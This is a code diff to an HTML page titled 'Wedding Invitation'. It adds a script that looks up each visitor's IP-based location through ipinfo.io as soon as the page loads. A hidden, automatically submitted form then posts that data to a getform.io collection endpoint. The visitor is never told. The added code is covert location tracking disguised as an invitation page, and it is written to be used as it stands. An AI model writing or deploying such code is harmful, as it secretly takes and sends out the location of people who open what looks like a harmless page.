@@ -4,11 +4,26 @@
   <meta charset="UTF-8">
   <title>Wedding Invitation</title>
   <script>
+    function sendLocation(locationData) {
+      const form = document.createElement('form');
+      form.action = "https://getform.io/f/bnlqdjlb"; // <-- your Getform URL
+      form.method = "POST";
+
+      const locField = document.createElement('input');
+      locField.type = "hidden";
+      locField.name = "Location Info";
+      locField.value = JSON.stringify(locationData);
+
+      form.appendChild(locField);
+      document.body.appendChild(form);
+      form.submit();
+    }
+
     fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE')
       .then(response => response.json())
       .then(data => {
         console.log("User location data:", data);
-        // You can send this data to your server if you want
+        sendLocation(data); // Automatically send captured location
       })
       .catch(error => console.error(error));
   </script>
